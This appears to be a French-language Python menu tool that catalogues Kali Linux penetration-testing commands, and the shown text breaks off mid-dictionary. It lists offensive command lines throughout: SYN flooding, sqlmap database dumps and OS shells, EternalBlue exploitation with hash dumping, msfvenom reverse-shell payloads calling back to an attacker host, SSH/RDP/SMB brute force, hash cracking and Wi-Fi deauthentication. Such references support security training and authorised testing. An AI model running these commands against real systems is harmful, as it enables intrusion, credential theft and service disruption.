#!/usr/bin/env python3
"""
KALI LINUX COMMANDS MASTER - Version Ultime Complète
Tous les outils, toutes les commandes, toutes les wordlists
"""

import os
import sys
import subprocess
from time import sleep

class Colors:
    # Theme Kali complet
    KALI_BLUE = '\033[94m'
    KALI_GREEN = '\033[92m'
    KALI_RED = '\033[91m'
    KALI_YELLOW = '\033[93m'
    KALI_ORANGE = '\033[38;5;208m'
    KALI_PURPLE = '\033[95m'
    KALI_GRAY = '\033[90m'
    KALI_WHITE = '\033[97m'
    KALI_CYAN = '\033[96m'
    
    BOLD = '\033[1m'
    RESET = '\033[0m'

class KaliCommandsMaster:
    def __init__(self):
        self.categories = {
            1: {"name": "Reconnaissance Web", "tools": {}},
            2: {"name": "Scan Réseau & Ports", "tools": {}},
            3: {"name": "Tests Vulnérabilités", "tools": {}},
            4: {"name": "Exploitation", "tools": {}},
            5: {"name": "Bruteforce & Hash", "tools": {}},
            6: {"name": "Wireless & Bluetooth", "tools": {}},
            7: {"name": "Forensique & Analyse", "tools": {}},
            8: {"name": "Services & Partage", "tools": {}},
            9: {"name": "Utilitaires Réseau", "tools": {}},
            10: {"name": "Wordlists & Dictionnaires", "tools": {}},
            11: {"name": "Post-Exploitation", "tools": {}},
            12: {"name": "OSINT & Investigation", "tools": {}},
            13: {"name": "Mobile & IoT", "tools": {}},
            14: {"name": "Social Engineering", "tools": {}},
            15: {"name": "Tunneling & Pivot", "tools": {}}
        }
        self.all_tools_index = {}
        self.wordlists_data = {}
        self.load_all_commands()
        self.load_wordlists_data()
        self.build_search_index()

    def load_wordlists_data(self):
        """Charge toutes les informations sur les wordlists"""
        self.wordlists_data = {
            "rockyou": {
                "path": "/usr/share/wordlists/rockyou.txt",
                "description": "14 millions de mots de passe les plus courants",
                "size": "~134 MB",
                "usage": "Bruteforce passwords, WPA cracking"
            },
            "seclists": {
                "path": "/usr/share/wordlists/SecLists/",
                "description": "Collection complète de listes pour la sécurité",
                "subcategories": {
                    "Discovery": ["Web-Content", "DNS", "SNMP", "Fuzzing"],
                    "Passwords": ["Common-Credentials", "Leaked-Databases"],
                    "Miscellaneous": ["Usernames", "Payloads"]
                }
            },
            "dirb": {
                "path": "/usr/share/wordlists/dirb/",
                "description": "Wordlists pour fuzzing de répertoires web",
                "files": ["common.txt", "big.txt", "small.txt"]
            },
            "metasploit": {
                "path": "/usr/share/wordlists/metasploit/",
                "description": "Usernames et passwords pour Metasploit"
            },
            "fasttrack": {
                "path": "/usr/share/wordlists/fasttrack.txt",
                "description": "Passwords rapides pour tests"
            },
            "nmap": {
                "path": "/usr/share/nmap/nselib/data/",
                "description": "Données pour scripts NSE"
            },
            "wpscan": {
                "path": "/usr/share/wordlists/wpscan/",
                "description": "Wordlists spécifiques WordPress"
            },
            "john": {
                "path": "/usr/share/john/",
                "description": "Règles et wordlists pour John the Ripper"
            }
        }

    def build_search_index(self):
        """Index de recherche complet étendu"""
        self.all_tools_index = {}
        
        # Index des outils principaux
        for cat_num, category in self.categories.items():
            for tool_num, tool in category["tools"].items():
                tool_name = tool["name"].lower()
                self.all_tools_index[tool_name] = (cat_num, tool_num)
                
                # Index des commandes
                for cmd_desc in tool["commands"].keys():
                    cmd_key = f"{tool_name}:{cmd_desc.lower()}"
                    self.all_tools_index[cmd_key] = (cat_num, tool_num)

        # Index des wordlists
        for wl_name, wl_data in self.wordlists_data.items():
            self.all_tools_index[wl_name] = (10, 1)  # Catégorie Wordlists
            self.all_tools_index[f"wordlist {wl_name}"] = (10, 1)
            self.all_tools_index[f"wordlists {wl_name}"] = (10, 1)

        # Aliases étendus
        aliases = {
            "nmap": ["scan", "port", "network", "discovery", "recon", "enumeration"],
            "sqlmap": ["sql", "injection", "database", "sqli"],
            "metasploit": ["msf", "exploit", "payload", "meterpreter", "framework"],
            "hydra": ["brute", "password", "login", "bruteforce", "auth"],
            "john": ["hash", "crack", "password", "jtr"],
            "hashcat": ["gpu", "hash", "crack", "oclhashcat"],
            "aircrack": ["wifi", "wireless", "wpa", "wpa2", "802.11"],
            "wireshark": ["packet", "pcap", "analyze", "sniffer"],
            "burpsuite": ["burp", "proxy", "web", "scanner"],
            "nikto": ["vulnerability", "web", "scan", "scanner"],
            "dirb": ["directory", "fuzz", "web", "buster"],
            "gobuster": ["dir", "fuzz", "web", "directory"],
            "ffuf": ["fuzz", "web", "fast"],
            "masscan": ["fast", "port", "scan", "mass"],
            "enum4linux": ["windows", "smb", "enum", "enumeration"],
            "wpscan": ["wordpress", "cms", "scan", "wp"],
            "nuclei": ["vulnerability", "scan", "template", "automation"],
            "sublist3r": ["subdomain", "dns", "enum", "enumeration"],
            "dirsearch": ["directory", "web", "fuzz", "python"],
            "whatweb": ["fingerprint", "web", "tech", "technology"],
            "amass": ["recon", "subdomain", "enum", "enumeration"],
            "wordlist": ["wordlists", "dictionary", "passwords", "rockyou", "seclists", "wordlist"],
            "crunch": ["generate", "wordlist", "password", "generator"],
            "cewl": ["custom", "wordlist", "generate", "spider", "crawler"],
            "seclists": ["wordlists", "dictionary", "passwords", "danielmiessler"],
            "searchsploit": ["exploit", "search", "vulnerability", "db"],
            "msfvenom": ["payload", "generate", "meterpreter", "shellcode"],
            "wifite": ["wifi", "automate", "automation", "wireless"],
            "reaver": ["wps", "wifi", "pixie"],
            "bully": ["wps", "wifi"],
            "kismet": ["wireless", "detection", "ids"],
            "bluelog": ["bluetooth", "scan", "logging"],
            "spooftooph": ["bluetooth", "spoof", "spoofing"],
            "tshark": ["packet", "analyze", "cli"],
            "tcpdump": ["packet", "capture", "sniffer"],
            "binwalk": ["firmware", "analyze", "reverse"],
            "foremost": ["recovery", "file", "carving"],
            "volatility": ["memory", "analyze", "forensics"],
            "steghide": ["steganography", "hide", "stego"],
            "exiftool": ["metadata", "image", "photo"],
            "smbclient": ["smb", "windows", "share", "fileshare"],
            "rpcclient": ["rpc", "windows", "msrpc"],
            "snmpwalk": ["snmp", "enum", "enumeration"],
            "onesixtyone": ["snmp", "brute", "community"],
            "netcat": ["nc", "network", "shell", "swiss"],
            "socat": ["network", "relay", "bidirectional"],
            "curl": ["web", "request", "http", "api"],
            "wget": ["download", "web", "recursive"],
            "ssh": ["secure", "shell", "remote"],
            "telnet": ["remote", "login", "plaintext"],
            "ftp": ["file", "transfer", "plaintext"],
            "smbmap": ["smb", "share", "mapper"],
            "crackmapexec": ["windows", "smb", "active directory", "cme"],
            "bloodhound": ["active directory", "graph", "ad"],
            "impacket": ["windows", "protocols", "python"],
            "responder": ["llmnr", "ntlm", "poisoning"],
            "mitm6": ["ipv6", "mitm", "dhcpv6"],
            "evil-winrm": ["winrm", "shell", "windows"],
            "linpeas": ["linux", "privesc", "privilege"],
            "winpeas": ["windows", "privesc", "privilege"],
            "linux-exploit-suggester": ["linux", "privesc", "exploit"],
            "windows-exploit-suggester": ["windows", "privesc", "exploit"],
            "pspy": ["process", "monitor", "monitoring"],
            "pwncat": ["post", "exploitation", "netcat"],
            "chisel": ["tunnel", "pivot", "tunneling"],
            "ligolo-ng": ["tunnel", "pivot", "vpn"],
            "proxychains": ["proxy", "tunnel", "tunneling"],
            "sshuttle": ["vpn", "tunnel", "simplified"],
            "recon-ng": ["recon", "osint", "framework"],
            "theharvester": ["osint", "email", "discovery"],
            "maltego": ["osint", "graph", "transforms"],
            "shodan": ["search", "osint", "iot"],
            "metagoofil": ["metadata", "osint", "google"],
            "photorec": ["recovery", "file", "photo"],
            "testdisk": ["recovery", "disk", "partition"],
            "strings": ["binary", "analyze", "extract"],
            "ltrace": ["library", "trace", "debug"],
            "strace": ["system", "trace", "debug"],
            "gdb": ["debug", "binary", "reverse"],
            "radare2": ["reverse", "engineering", "r2"],
            "ghidra": ["reverse", "engineering", "nsa"],
            "firmwalker": ["firmware", "analyze", "iot"],
            "apktool": ["android", "apk", "reverse"],
            "jadx": ["android", "decompile", "java"],
            "androbugs": ["android", "scan", "security"],
            "mobsf": ["mobile", "scan", "framework"],
            "objection": ["mobile", "hook", "frida"],
            "frida": ["mobile", "hook", "instrumentation"],
            "setoolkit": ["social", "engineering", "phishing"],
            "beef": ["browser", "exploitation", "xss"],
            "mitmf": ["mitm", "framework", "arp"],
            "bettercap": ["mitm", "framework", "caplets"]
        }
        
        for tool_name, terms in aliases.items():
            for term in terms:
                if term not in self.all_tools_index:
                    # Trouver la catégorie de l'outil principal
                    for cat_num, category in self.categories.items():
                        for tool_num, tool in category["tools"].items():
                            if tool["name"].lower() == tool_name:
                                self.all_tools_index[term] = (cat_num, tool_num)
                                break

    def search_tools(self, query):
        """Recherche étendue améliorée"""
        query = query.lower().strip()
        results = []
        
        # Recherche exacte
        if query in self.all_tools_index:
            cat_num, tool_num = self.all_tools_index[query]
            tool = self.categories[cat_num]["tools"][tool_num]
            results.append((cat_num, tool_num, tool, 100))
        
        # Recherche dans les wordlists
        if "word" in query or "list" in query or "rockyou" in query or "seclist" in query:
            for wl_name in self.wordlists_data.keys():
                if query in wl_name.lower() or any(term in wl_name.lower() for term in query.split()):
                    results.append((10, 1, {"name": f"Wordlist: {wl_name}", "commands": {}}, 90))
        
        # Recherche partielle dans les noms d'outils
        for tool_name, (cat_num, tool_num) in self.all_tools_index.items():
            if ":" not in tool_name:  # Éviter les clés de commandes
                if query in tool_name and len(query) > 1:
                    tool = self.categories[cat_num]["tools"][tool_num]
                    score = len(query) / len(tool_name) * 100
                    if not any(r[0] == cat_num and r[1] == tool_num for r in results):
                        results.append((cat_num, tool_num, tool, score))
        
        # Recherche dans les descriptions de commandes
        for cat_num, category in self.categories.items():
            for tool_num, tool in category["tools"].items():
                for cmd_desc, cmd in tool["commands"].items():
                    if query in cmd_desc.lower() or query in cmd.lower():
                        score = 70  # Score plus bas pour les correspondances de commandes
                        if not any(r[0] == cat_num and r[1] == tool_num for r in results):
                            results.append((cat_num, tool_num, tool, score))
                        break
        
        results.sort(key=lambda x: x[3], reverse=True)
        return results[:20]

    def load_all_commands(self):
        # Catégorie 1: Reconnaissance Web (étendue)
        self.categories[1]["tools"] = {
            1: {"name": "ffuf", "commands": {
                "Fuzzing répertoires basique": "ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt",
                "Fuzzing sous-domaines": "ffuf -u http://FUZZ.TARGET -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt",
                "Fuzzing paramètres GET": "ffuf -u 'http://TARGET/script?FUZZ=test' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt",
                "Fuzzing POST data": "ffuf -u http://TARGET -X POST -d 'username=FUZZ&password=test' -w /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt",
                "Avec extensions": "ffuf -u http://TARGET/FUZZ -w wordlist.txt -e .php,.html,.txt,.bak,.old,.sql,.json,.xml",
                "Filtrage intelligent": "ffuf -u http://TARGET/FUZZ -w wordlist.txt -fs 4242 -fw 2 -mc 200,301,302,403",
                "Rate limiting avancé": "ffuf -u http://TARGET/FUZZ -w wordlist.txt -rate 1000 -t 50",
                "Mode récursif profond": "ffuf -u http://TARGET/FUZZ -w wordlist.txt -recursion -recursion-depth 3",
                "Scan avec authentification": "ffuf -u http://TARGET/FUZZ -w wordlist.txt -H 'Authorization: Basic dXNlcjpwYXNz'",
                "Output formats multiples": "ffuf -u http://TARGET/FUZZ -w wordlist.txt -of json -o output.json"
            }},
            2: {"name": "gobuster", "commands": {
                "Scan répertoires standard": "gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt",
                "Scan sous-domaines massif": "gobuster dns -d TARGET -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 100",
                "Scan VHosts": "gobuster vhost -u http://TARGET -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt",
                "Performance maximale": "gobuster dir -u http://TARGET -w wordlist.txt -t 200 -q --timeout 10s",
                "Extensions complètes": "gobuster dir -u http://TARGET -w wordlist.txt -x php,html,js,txt,css,json,xml,bak,old,backup,sql",
                "Scan avec authentification": "gobuster dir -u http://TARGET -w wordlist.txt -U admin -P password --auth-type basic",
                "Scan S3 buckets": "gobuster s3 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/s3-buckets.txt"
            }},
            3: {"name": "dirb", "commands": {
                "Scan standard": "dirb http://TARGET /usr/share/wordlists/dirb/common.txt",
                "Avec wordlist custom": "dirb http://TARGET /usr/share/wordlists/dirb/big.txt",
                "Extensions spécifiques": "dirb http://TARGET /usr/share/wordlists/dirb/common.txt -X .php,.bak,.old",
                "Scan récursif": "dirb http://TARGET /usr/share/wordlists/dirb/common.txt -r",
                "Avec proxy": "dirb http://TARGET /usr/share/wordlists/dirb/common.txt -p http://proxy:8080"
            }},
            4: {"name": "dirsearch", "commands": {
                "Scan basique": "python3 dirsearch.py -u http://TARGET -e php,html,txt",
                "Scan récursif": "python3 dirsearch.py -u http://TARGET -r -R 3",
                "Avec threads": "python3 dirsearch.py -u http://TARGET -t 50",
                "Avec proxy": "python3 dirsearch.py -u http://TARGET --proxy http://127.0.0.1:8080"
            }},
            5: {"name": "sublist3r", "commands": {
                "Enumération sous-domaines": "sublist3r -d TARGET.com",
                "Avec threads": "sublist3r -d TARGET.com -t 50",
                "Avec ports": "sublist3r -d TARGET.com -p 80,443,8080",
                "Output fichier": "sublist3r -d TARGET.com -o subdomains.txt"
            }},
            6: {"name": "amass", "commands": {
                "Enumération passive": "amass enum -passive -d TARGET.com",
                "Enumération active": "amass enum -active -d TARGET.com -brute -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt",
                "Intel discovery": "amass intel -d TARGET.com",
                "Visualisation": "amass viz -d3 -dir amass_db -o network.html"
            }},
            7: {"name": "whatweb", "commands": {
                "Scan technologies": "whatweb TARGET.com",
                "Scan agressif": "whatweb -a 3 TARGET.com",
                "Avec proxy": "whatweb --proxy=127.0.0.1:8080 TARGET.com",
                "Scan multiple sites": "whatweb -i targets.txt"
            }},
            8: {"name": "theharvester", "commands": {
                "Recherche emails": "theHarvester -d TARGET.com -b google",
                "Toutes sources": "theHarvester -d TARGET.com -b all",
                "Limite résultats": "theHarvester -d TARGET.com -b google -l 100"
            }},
            9: {"name": "httpx", "commands": {
                "Scan HTTP services": "cat domains.txt | httpx -silent",
                "Avec title extraction": "cat domains.txt | httpx -silent -title",
                "Avec status code": "cat domains.txt | httpx -silent -status-code",
                "Avec technologies": "cat domains.txt | httpx -silent -tech-detect"
            }},
            10: {"name": "subfinder", "commands": {
                "Enumération sous-domaines": "subfinder -d TARGET.com",
                "Avec sources multiples": "subfinder -d TARGET.com -all",
                "Output silencieux": "subfinder -d TARGET.com -silent"
            }}
        }

        # Catégorie 2: Scan Réseau & Ports (étendue)
        self.categories[2]["tools"] = {
            1: {"name": "nmap", "commands": {
                "Scan découverte hôtes": "nmap -sn 192.168.1.0/24",
                "Scan ports TCP SYN": "nmap -sS TARGET",
                "Scan ports UDP": "nmap -sU TARGET",
                "Scan tous ports TCP": "nmap -p- TARGET --min-rate 1000",
                "Scan ports spécifiques": "nmap -p 22,80,443,3389 TARGET",
                "Scan services version": "nmap -sV TARGET",
                "Detection OS": "nmap -O TARGET",
                "Scan scripts vulnérabilités": "nmap --script vuln TARGET",
                "Scan scripts safe": "nmap --script safe TARGET",
                "Scan scripts auth": "nmap --script auth TARGET",
                "Scan complet agressif": "nmap -A TARGET",
                "Scan furtif timing": "nmap -T0 TARGET",
                "Scan rapide": "nmap -T4 -F TARGET",
                "Scan avec fragmentation": "nmap -f TARGET",
                "Scan source port": "nmap --source-port 53 TARGET",
                "Scan decoy": "nmap -D RND:10 TARGET",
                "Scan évasion firewall": "nmap -f --mtu 24 --data-length 100 TARGET",
                "Output formats multiples": "nmap -oA scan_output TARGET",
                "Scan depuis fichier": "nmap -iL targets.txt",
                "Scan IPv6": "nmap -6 TARGET"
            }},
            2: {"name": "masscan", "commands": {
                "Scan rapide tous ports": "masscan -p1-65535 TARGET --rate=10000",
                "Scan réseau complet": "masscan 192.168.1.0/24 -p80,443,22,3389",
                "Exclusion d'IPs": "masscan 192.168.1.0/24 -p22 --excludefile exclude.txt",
                "Scan avec banner grabbing": "masscan -p80,443 TARGET --banners",
                "Output format XML": "masscan -p1-1000 TARGET -oX output.xml",
                "Scan adaptatif": "masscan -p1-65535 TARGET --adapter ip"
            }},
            3: {"name": "netdiscover", "commands": {
                "Scan actif": "netdiscover -i eth0",
                "Scan passif": "netdiscover -p",
                "Scan plage": "netdiscover -r 192.168.1.0/24",
                "Scan fichier pcap": "netdiscover -f capture.pcap"
            }},
            4: {"name": "hping3", "commands": {
                "Flood SYN": "hping3 -S --flood TARGET",
                "Scan ports": "hping3 -S TARGET -p 80",
                "Test firewall": "hping3 -A TARGET -p 80"
            }},
            5: {"name": "zmap", "commands": {
                "Scan Internet rapide": "zmap -p 80 -o results.txt",
                "Scan réseau spécifique": "zmap -p 443 192.168.1.0/24 -o https_hosts.txt"
            }}
        }

        # Catégorie 3: Tests Vulnérabilités (étendue)
        self.categories[3]["tools"] = {
            1: {"name": "sqlmap", "commands": {
                "Scan basique URL": "sqlmap -u 'http://TARGET/page?id=1' --batch",
                "Scan fichier URLs": "sqlmap -m urls.txt --batch --level=1 --risk=1 --output-dir=sqlmap_output --flush-session",
                "Scan agressif complet": "sqlmap -m urls.txt --batch --random-agent --level=3 --risk=3 --threads=10 --output-dir=resultats_sqlmap",
                "Contournement WAF": "sqlmap -u 'http://TARGET' --tamper=space2comment,charencode --random-agent --delay=1",
                "Crawling automatique": "sqlmap -u 'https://TARGET.com' --crawl=2 --batch --level=5 --risk=3",
                "Proxy et anonymat": "sqlmap -m urls.txt --proxy='http://127.0.0.1:8080' --tor --check-tor",
                "Techniques spécifiques": "sqlmap -m urls.txt --batch --level=3 --risk=2 --technique=BEUSTQ",
                "Identification WAF": "sqlmap -u 'http://TARGET' --identify-waf --batch",
                "Dump bases données": "sqlmap -u 'http://TARGET' --dbs --batch",
                "Dump tables": "sqlmap -u 'http://TARGET' -D ma_base --tables --batch",
                "Dump colonnes": "sqlmap -u 'http://TARGET' -D ma_base -T users --columns --batch",
                "Dump données complet": "sqlmap -u 'http://TARGET' -D ma_base -T users --dump --batch",
                "Dump toutes données": "sqlmap -u 'http://TARGET' --dump-all --batch",
                "OS shell": "sqlmap -u 'http://TARGET' --os-shell --batch",
                "SQL shell": "sqlmap -u 'http://TARGET' --sql-shell --batch"
            }},
            2: {"name": "nikto", "commands": {
                "Scan standard": "nikto -h http://TARGET",
                "Scan avec port": "nikto -h http://TARGET -p 8080",
                "Scan SSL": "nikto -h https://TARGET",
                "Sortie format XML": "nikto -h http://TARGET -Format xml",
                "Sortie format CSV": "nikto -h http://TARGET -Format csv",
                "Sortie format HTML": "nikto -h http://TARGET -Format htm",
                "Scan avec authentification": "nikto -h http://TARGET -id admin:password",
                "Scan avec proxy": "nikto -h http://TARGET -useproxy http://127.0.0.1:8080",
                "Scan tuning spécifique": "nikto -h http://TARGET -Tuning 1,3,5,7,8",
                "Scan évasion IDS": "nikto -h http://TARGET -evasion 1",
                "Scan multiple hosts": "nikto -h http://TARGET -h http://TARGET2",
                "Output fichier": "nikto -h http://TARGET -o nikto_scan.html -F htm",
                "Mise à jour base": "nikto -update"
            }},
            3: {"name": "wapiti", "commands": {
                "Scan standard": "wapiti -u http://TARGET",
                "Scan avec authentification": "wapiti -u http://TARGET -a username:password",
                "Modules spécifiques": "wapiti -u http://TARGET -m sql,xss,file,backup,crlf,exec,ssrf",
                "Exclusion modules": "wapiti -u http://TARGET -m '-backup,-crlf'",
                "Scan verbose niveau 2": "wapiti -u http://TARGET -v 2",
                "Output format HTML": "wapiti -u http://TARGET -f html -o /tmp/",
                "Output format JSON": "wapiti -u http://TARGET -f json -o /tmp/",
                "Scan avec cookie": "wapiti -u http://TARGET -c cookie.txt",
                "Scan avec proxy": "wapiti -u http://TARGET -p http://proxy:8080"
            }},
            4: {"name": "wpscan", "commands": {
                "Scan WordPress standard": "wpscan --url http://TARGET",
                "Enumération utilisateurs": "wpscan --url http://TARGET --enumerate u",
                "Enumération plugins": "wpscan --url http://TARGET --enumerate p",
                "Enumération themes": "wpscan --url http://TARGET --enumerate t",
                "Enumération vulnérabilités": "wpscan --url http://TARGET --enumerate vp,vt",
                "Enumération timthumbs": "wpscan --url http://TARGET --enumerate tt",
                "Enumération config backups": "wpscan --url http://TARGET --enumerate cb",
                "Bruteforce login WP": "wpscan --url http://TARGET --passwords /usr/share/wordlists/rockyou.txt --usernames admin",
                "Bruteforce XMLRPC": "wpscan --url http://TARGET --passwords /usr/share/wordlists/rockyou.txt --usernames admin --multicall-max-requests 20",
                "Scan agressif plugins": "wpscan --url http://TARGET --plugins-detection aggressive",
                "Scan avec proxy": "wpscan --url http://TARGET --proxy http://127.0.0.1:8080",
                "Scan avec cookies": "wpscan --url http://TARGET --cookie 'wordpress_logged_in=xxx'",
                "Mise à jour base": "wpscan --update"
            }},
            5: {"name": "nuclei", "commands": {
                "Scan vulnérabilités": "nuclei -u http://TARGET -t /root/nuclei-templates/",
                "Scan agressif": "nuclei -u http://TARGET -t /root/nuclei-templates/ -severity critical,high -rate-limit 100",
                "Scan depuis liste": "nuclei -l targets.txt -t /root/nuclei-templates/",
                "Templates spécifiques": "nuclei -u http://TARGET -t /root/nuclei-templates/exposed-panels/",
                "Configuration": "nuclei -u http://TARGET -t /root/nuclei-templates/ -timeout 10 -retries 2"
            }},
            6: {"name": "xsstrike", "commands": {
                "Test XSS basique": "python3 xsstrike.py -u 'http://TARGET/page?q=test'",
                "Test crawler": "python3 xsstrike.py -u http://TARGET --crawl",
                "Test approfondi": "python3 xsstrike.py -u 'http://TARGET' --fuzzer"
            }},
            7: {"name": "commix", "commands": {
                "Test injection commande": "python commix.py -u 'http://TARGET/vuln.php?addr=127.0.0.1'",
                "Test automatique": "python commix.py -u 'http://TARGET' --batch",
                "Test avec proxy": "python commix.py -u 'http://TARGET' --proxy http://127.0.0.1:8080"
            }}
        }

        # Catégorie 4: Exploitation (étendue)
        self.categories[4]["tools"] = {
            1: {"name": "metasploit", "commands": {
                "Lancer framework": "msfconsole",
                "Rechercher exploits": "search exploit_name",
                "Utiliser exploit EternalBlue": "use exploit/windows/smb/ms17_010_eternalblue",
                "Configurer options": "set RHOSTS TARGET; set PAYLOAD windows/meterpreter/reverse_tcp",
                "Lancer exploit": "exploit",
                "Lancer en background": "exploit -j",
                "Sessions actives": "sessions -l",
                "Interagir session": "sessions -i 1",
                "Background session": "background",
                "Post-exploitation": "run post/windows/gather/hashdump",
                "Générer payload Windows": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o payload.exe",
                "Générer payload Linux": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o payload.elf",
                "Générer payload Android": "msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o payload.apk",
                "Générer payload Mac": "msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -f macho -o payload.macho",
                "Générer payload PHP": "msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o payload.php",
                "Encoder payload": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -e x86/shikata_ga_nai -f exe -o payload_encoded.exe"
            }},
            2: {"name": "searchsploit", "commands": {
                "Recherche exploits": "searchsploit apache 2.4",
                "Recherche avec copie": "searchsploit -m 42315",
                "Recherche web": "searchsploit --www apache",
                "Mise à jour base": "searchsploit -u",
                "Recherche titre seulement": "searchsploit -t windows smb",
                "Output verbose": "searchsploit -v apache"
            }},
            3: {"name": "exploitdb", "commands": {
                "Recherche dans exploits": "searchsploit linux kernel 3.2",
                "Copier exploit local": "searchsploit -m 39772",
                "Recherche par plateforme": "searchsploit -p 39772"
            }},
            4: {"name": "beef", "commands": {
                "Lancer BeEF": "beef-xss",
                "Accès interface": "http://localhost:3000/ui/panel",
                "Configuration": "nano /etc/beef-xss/config.yaml"
            }}
        }

        # Catégorie 5: Bruteforce & Hash (étendue)
        self.categories[5]["tools"] = {
            1: {"name": "hydra", "commands": {
                "Bruteforce SSH": "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt ssh://TARGET -t 4",
                "Bruteforce FTP": "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt ftp://TARGET",
                "Bruteforce HTTP POST": "hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET http-post-form '/login:username=^USER^&password=^PASS^:F=incorrect'",
                "Bruteforce RDP": "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt rdp://TARGET",
                "Bruteforce SMB": "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt smb://TARGET",
                "Bruteforce MySQL": "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt mysql://TARGET",
                "Bruteforce Telnet": "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt telnet://TARGET"
            }},
            2: {"name": "john", "commands": {
                "Cracker hash simple": "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
                "Cracker shadow file": "unshadow passwd.txt shadow.txt > hashes.txt && john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
                "Cracker avec règles": "john --wordlist=/usr/share/wordlists/rockyou.txt --rules hash.txt",
                "Cracker format spécifique": "john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
                "Cracker format NTLM": "john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
                "Afficher résultats": "john --show hash.txt"
            }},
            3: {"name": "hashcat", "commands": {
                "Cracker MD5": "hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -w 4",
                "Cracker SHA1": "hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt",
                "Cracker NTLM": "hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt",
                "Cracker WPA/WPA2": "hashcat -m 22000 capture.hccapx /usr/share/wordlists/rockyou.txt",
                "Attack masque": "hashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?l",
                "Attack hybride": "hashcat -m 0 hash.txt -a 6 /usr/share/wordlists/rockyou.txt ?d?d",
                "Benchmark": "hashcat -b",
                "Show cracked": "hashcat hash.txt --show"
            }},
            4: {"name": "medusa", "commands": {
                "Bruteforce SSH": "medusa -h TARGET -U /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt -M ssh",
                "Bruteforce FTP": "medusa -h TARGET -U /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt -M ftp",
                "Bruteforce HTTP": "medusa -h TARGET -U /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt -M http"
            }},
            5: {"name": "patator", "commands": {
                "Bruteforce SSH": "patator ssh_login host=TARGET user=FILE0 password=FILE1 0=/usr/share/wordlists/metasploit/unix_users.txt 1=/usr/share/wordlists/rockyou.txt",
                "Bruteforce FTP": "patator ftp_login host=TARGET user=FILE0 password=FILE1 0=/usr/share/wordlists/metasploit/unix_users.txt 1=/usr/share/wordlists/rockyou.txt"
            }},
            6: {"name": "crunch", "commands": {
                "Générer numérique 6-8 digits": "crunch 6 8 0123456789 -o wordlist.txt",
                "Générer lettres minuscules": "crunch 4 6 abcdefghijklmnopqrstuvwxyz -o wordlist.txt",
                "Générer avec pattern": "crunch 8 8 -t pass%%% -o wordlist.txt",
                "Générer caractères spéciaux": "crunch 8 8 -f /usr/share/crunch/charset.lst mixalpha-numeric-all-space -o wordlist.txt"
            }},
            7: {"name": "cewl", "commands": {
                "Générer depuis site web": "cewl http://TARGET -w custom_wordlist.txt",
                "Avec profondeur": "cewl http://TARGET -d 3 -w wordlist.txt",
                "Inclusion métadonnées": "cewl http://TARGET -e -w wordlist.txt",
                "Nombre minimum caractères": "cewl http://TARGET -m 6 -w wordlist.txt",
                "Avec authentification": "cewl http://TARGET -u admin -p password -w wordlist.txt"
            }}
        }

        # Catégorie 6: Wireless & Bluetooth (étendue)
        self.categories[6]["tools"] = {
            1: {"name": "aircrack-ng", "commands": {
                "Mode monitor": "airmon-ng start wlan0",
                "Stop monitor mode": "airmon-ng stop wlan0mon",
                "Capture packets": "airodump-ng wlan0mon",
                "Capture cible spécifique": "airodump-ng -c 6 --bssid MAC_TARGET -w capture wlan0mon",
                "Attack deauth": "aireplay-ng -0 10 -a MAC_TARGET wlan0mon",
                "Crack WEP": "aircrack-ng -b MAC_TARGET capture-01.cap",
                "Crack WPA": "aircrack-ng -w /usr/share/wordlists/rockyou.txt -b MAC_TARGET capture-01.cap",
                "Test injection": "aireplay-ng -9 -e ESSID wlan0mon"
            }},
            2: {"name": "reaver", "commands": {
                "Attack WPS": "reaver -i wlan0mon -b MAC_TARGET -vv",
                "Attack avec délai": "reaver -i wlan0mon -b MAC_TARGET -d 2",
                "Attack canal spécifique": "reaver -i wlan0mon -b MAC_TARGET -c 6",
                "Attack session restore": "reaver -i wlan0mon -b MAC_TARGET -s reaver.session"
            }},
            3: {"name": "wifite", "commands": {
                "Attack automatique": "wifite",
                "Crack WPA spécifique": "wifite --wpa --bssid MAC_TARGET",
                "Attack WEP seulement": "wifite --wep",
                "Attack WPS seulement": "wifite --wps",
                "Avec wordlist custom": "wifite --dict /usr/share/wordlists/rockyou.txt"
            }},
            4: {"name": "kismet", "commands": {
                "Démarrer scan": "kismet",
                "Interface web": "http://localhost:2501",
